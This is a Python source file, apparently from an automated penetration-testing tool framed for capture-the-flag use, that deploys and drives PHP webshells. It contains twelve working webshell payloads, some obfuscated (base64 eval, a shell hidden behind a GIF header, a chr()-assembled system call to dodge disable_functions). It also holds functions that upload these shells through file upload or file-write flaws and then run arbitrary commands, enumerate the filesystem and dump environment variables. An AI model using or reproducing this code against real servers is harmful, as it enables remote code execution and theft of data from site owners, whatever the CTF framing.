"""Webshell deployment and interaction module for CTF.

Supports deploying webshells via upload, file write exploits, or direct
injection, then interacting with them to execute commands and read flags.
"""
from __future__ import annotations

import base64
import io
import logging
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin

import requests

log = logging.getLogger("autopnex.ctf.webshell_manager")

# ---------------------------------------------------------------------------
# Webshell templates
# ---------------------------------------------------------------------------

WEBSHELLS: Dict[str, tuple] = {
    "classic": (
        "shell.php",
        b'<?php @eval($_POST["cmd"]); ?>',
        "POST cmd=system('cat /flag');",
    ),
    "post_cmd": (
        "shell.php",
        b'<?php echo shell_exec($_POST["cmd"]); ?>',
        "POST cmd=cat /flag",
    ),
    "get_cmd": (
        "shell.php",
        b'<?php system($_GET["cmd"]); ?>',
        "GET ?cmd=cat /flag",
    ),
    "eval": (
        "shell.php",
        b'<?php @eval($_GET["cmd"]); ?>',
        "GET ?cmd=system('cat /flag');",
    ),
    "base64": (
        "shell.php",
        b'<?php eval(base64_decode($_POST["cmd"])); ?>',
        "POST cmd=c3lzdGVtKCdjYXQgL2ZsYWcnKTs= (base64 of system('cat /flag'))",
    ),
    "assert": (
        "shell.php",
        b'<?php assert($_POST["cmd"]); ?>',
        "POST cmd=system('cat /flag')",
    ),
    "preg": (
        "shell.php",
        b'<?php preg_replace("/.*/e", $_POST["cmd"], ""); ?>',
        "POST cmd=system('cat /flag') (PHP < 7.0)",
    ),
    "short_tag": (
        "shell.php",
        b'<?=system($_GET["cmd"])?>',
        r"GET ?cmd=cat /flag",
    ),
    "minimal": (
        "shell.php",
        b'<?=`$_GET[1]`?>',
        r"GET ?1=cat /flag",
    ),
    "callback": (
        "shell.php",
        b'<?php call_user_func("system", $_GET["cmd"]); ?>',
        "GET ?cmd=cat /flag",
    ),
    "stealthy": (
        "shell.gif",
        b'GIF89a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<?php system($_GET["cmd"]); ?>',
        "GET ?cmd=cat /flag",
    ),
    "disable_bypass": (
        "shell.php",
        b'<?php $a=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$a($_GET["cmd"]); ?>',
        "GET ?cmd=cat /flag (bypasses disable_functions for system)",
    ),
}

FLAG_PATHS: List[str] = [
    "/flag",
    "/flag.txt",
    "/flag",
    "/root/flag",
    "/root/flag.txt",
    "/home/ctf/flag",
    "/home/ctf/flag.txt",
    "/home/flag",
    "/tmp/flag",
    "/var/flag",
    "/var/www/flag",
    "/var/www/html/flag",
    "/app/flag",
    "/challenge/flag",
    "/ctf/flag",
    "/readflag",
]

FLAG_READ_COMMANDS: List[str] = [
    "cat /flag",
    "cat /flag.txt",
    "cat /flag*",
    "cat /*/flag",
    "cat /*/flag.txt",
    "tac /flag",
    "tac /flag.txt",
    "head -c1000 /flag*",
    "base64 /flag",
    "base64 /flag.txt",
    "cat /root/flag",
    "cat /root/flag.txt",
    "cat /home/*/flag",
    "cat /home/ctf/flag.txt",
    "cat /tmp/flag",
    "cat /var/www/html/flag",
    "cat /challenge/flag",
    "cat /ctf/flag",
    "find / -name 'flag*' -exec cat {} \\; 2>/dev/null",
    "find / -name '*.txt' -exec grep -l 'flag{' {} \\; 2>/dev/null",
    "ls -la /flag* 2>/dev/null",
    "env",
    "printenv",
    "ls /",
    "whoami",
    "id",
    "pwd",
    "ls -la /",
    "ls -la /root 2>/dev/null",
    "ls -la /home 2>/dev/null",
]


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class WebshellResult:
    url: str
    shell_type: str
    deployed: bool
    verified: bool
    deploy_method: str = ""
    response_body: str = ""
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "shell_type": self.shell_type,
            "deployed": self.deployed,
            "verified": self.verified,
            "deploy_method": self.deploy_method,
            "response_length": len(self.response_body),
            "error": self.error,
        }


# ---------------------------------------------------------------------------
# WebshellManager
# ---------------------------------------------------------------------------

class WebshellManager:
    """Webshell deployment, verification, execution, and flag reading."""

    def __init__(self, session: requests.Session, timeout: int = 15):
        self._session = session
        self._timeout = timeout
        self._active_shells: List[WebshellResult] = []

    @property
    def active_shells(self) -> List[WebshellResult]:
        return self._active_shells

    # ------------------------------------------------------------------
    # Deployment
    # ------------------------------------------------------------------

    def deploy_via_upload(
        self,
        upload_url: str,
        file_field: str = "file",
        extra_fields: Optional[Dict[str, str]] = None,
        shell_types: Optional[List[str]] = None,
    ) -> List[WebshellResult]:
        """Deploy webshells via file upload endpoint."""
        results: List[WebshellResult] = []
        types_to_try = shell_types or list(WEBSHELLS.keys())[:5]

        for stype in types_to_try:
            if stype not in WEBSHELLS:
                continue
            fname, content, _ = WEBSHELLS[stype]
            try:
                files = {file_field: (fname, io.BytesIO(content), "application/octet-stream")}
                data = extra_fields or {}
                r = self._session.post(
                    upload_url,
                    files=files,
                    data=data,
                    timeout=self._timeout,
                    allow_redirects=True,
                )
                result = WebshellResult(
                    url=str(r.url),
                    shell_type=stype,
                    deployed=r.status_code in (200, 201, 302),
                    verified=False,
                    deploy_method="upload",
                    response_body=r.text[:2000],
                )
            except requests.RequestException as e:
                result = WebshellResult(
                    url=upload_url,
                    shell_type=stype,
                    deployed=False,
                    verified=False,
                    deploy_method="upload",
                    error=str(e),
                )
            results.append(result)

        self._active_shells.extend([r for r in results if r.deployed])
        return results

    def deploy_via_write(self, target_url: str, content: Optional[bytes] = None) -> Optional[WebshellResult]:
        """Deploy webshell via arbitrary file write exploit (e.g. LFI-to-write)."""
        shell = content or WEBSHELLS["classic"][1]
        try:
            r = self._session.post(
                target_url,
                data=shell,
                timeout=self._timeout,
            )
            result = WebshellResult(
                url=target_url,
                shell_type="write_arbitrary",
                deployed=r.status_code in (200, 201),
                verified=False,
                deploy_method="file_write",
                response_body=r.text[:2000],
            )
            if result.deployed:
                self._active_shells.append(result)
            return result
        except requests.RequestException as e:
            return WebshellResult(
                url=target_url,
                shell_type="write_arbitrary",
                deployed=False,
                verified=False,
                error=str(e),
            )

    # ------------------------------------------------------------------
    # Verification
    # ------------------------------------------------------------------

    def verify(self, shell_url: str, shell_type: str = "classic") -> bool:
        """Verify a webshell is working by sending a test command."""
        test_code = "echo AUTOPENX_OK_7a3f;"
        try:
            if shell_type in ("get_cmd", "short_tag", "minimal", "callback"):
                # GET-based shells
                r = self._session.get(
                    shell_url,
                    params={"cmd": test_code, "1": test_code},
                    timeout=self._timeout,
                )
            else:
                # POST-based shells
                r = self._session.post(
                    shell_url,
                    data={"cmd": test_code},
                    timeout=self._timeout,
                )
            verified = "AUTOPENX_OK_7a3f" in r.text
            return verified
        except requests.RequestException:
            return False

    # ------------------------------------------------------------------
    # Execution
    # ------------------------------------------------------------------

    def execute(self, shell_url: str, command: str, shell_type: str = "classic") -> Dict[str, Any]:
        """Execute a command on a deployed webshell."""
        try:
            if shell_type in ("get_cmd", "short_tag", "minimal", "callback"):
                r = self._session.get(
                    shell_url,
                    params={"cmd": command, "1": command},
                    timeout=self._timeout,
                )
            elif shell_type == "base64":
                encoded = base64.b64encode(command.encode()).decode()
                r = self._session.post(
                    shell_url,
                    data={"cmd": encoded},
                    timeout=self._timeout,
                )
            else:
                r = self._session.post(
                    shell_url,
                    data={"cmd": f"system('{command}');"},
                    timeout=self._timeout,
                )
            return {
                "command": command,
                "status_code": r.status_code,
                "output": r.text,
                "url": str(r.url),
            }
        except requests.RequestException as e:
            return {"command": command, "error": str(e)}

    # ------------------------------------------------------------------
    # Flag reading
    # ------------------------------------------------------------------

    def read_flag(self, shell_url: str, shell_type: str = "classic") -> Optional[Dict[str, Any]]:
        """Attempt to read the flag through a webshell."""
        # First try enumeration to find the flag
        enum_result = self.execute(shell_url, "find / -name 'flag*' 2>/dev/null | head -20", shell_type)
        output = enum_result.get("output", "")

        # Look for flag paths in output
        found_paths = []
        for line in output.splitlines():
            line = line.strip()
            if line and "flag" in line.lower():
                found_paths.append(line)

        # If we found specific paths, try reading them
        targets = found_paths or FLAG_PATHS
        for flag_path in targets[:10]:
            for read_cmd in [f"cat {flag_path}", f"tac {flag_path}", f"head -c 2000 {flag_path}"]:
                result = self.execute(shell_url, read_cmd, shell_type)
                out = result.get("output", "")
                if out:
                    # Check for flag pattern
                    import re
                    flag_match = re.search(r'[A-Za-z0-9_]+\{[^}]+\}', out, re.I)
                    if flag_match:
                        return {
                            "flag": flag_match.group(0),
                            "command": read_cmd,
                            "shell_url": shell_url,
                            "output": out[:2000],
                        }
                    # Also check if output looks like a flag
                    if out.strip() and "error" not in out.lower() and len(out.strip()) < 500:
                        return {
                            "flag_candidate": out.strip(),
                            "command": read_cmd,
                            "shell_url": shell_url,
                            "output": out[:2000],
                        }

        # If file-specific reading failed, try the broad commands
        for cmd in FLAG_READ_COMMANDS:
            result = self.execute(shell_url, cmd, shell_type)
            out = result.get("output", "")
            import re
            flag_match = re.search(r'[A-Za-z0-9_]+\{[^}]+\}', out, re.I)
            if flag_match:
                return {
                    "flag": flag_match.group(0),
                    "command": cmd,
                    "shell_url": shell_url,
                    "output": out[:2000],
                }

        return None

    # ------------------------------------------------------------------
    # Convenience
    # ------------------------------------------------------------------

    def full_cycle(
        self,
        deploy_url: str,
        verify_url: Optional[str] = None,
        shell_type: str = "classic",
    ) -> Optional[str]:
        """Deploy, verify, and read flag in one call. Returns flag or None."""
        # Deploy
        results = self.deploy_via_upload(deploy_url, shell_types=[shell_type])
        if not results or not results[0].deployed:
            return None

        # Verify
        target = verify_url or deploy_url
        if not self.verify(target, shell_type):
            # Try a few alternative URLs
            for alt in [deploy_url.rsplit("/", 1)[0] + "/shell.php",
                        deploy_url + "/shell.php",
                        deploy_url.replace("/upload", "/shell.php")]:
                if self.verify(alt, shell_type):
                    target = alt
                    break
            else:
                return None

        # Read flag
        flag_result = self.read_flag(target, shell_type)
        if flag_result:
            return flag_result.get("flag") or flag_result.get("flag_candidate")
        return None
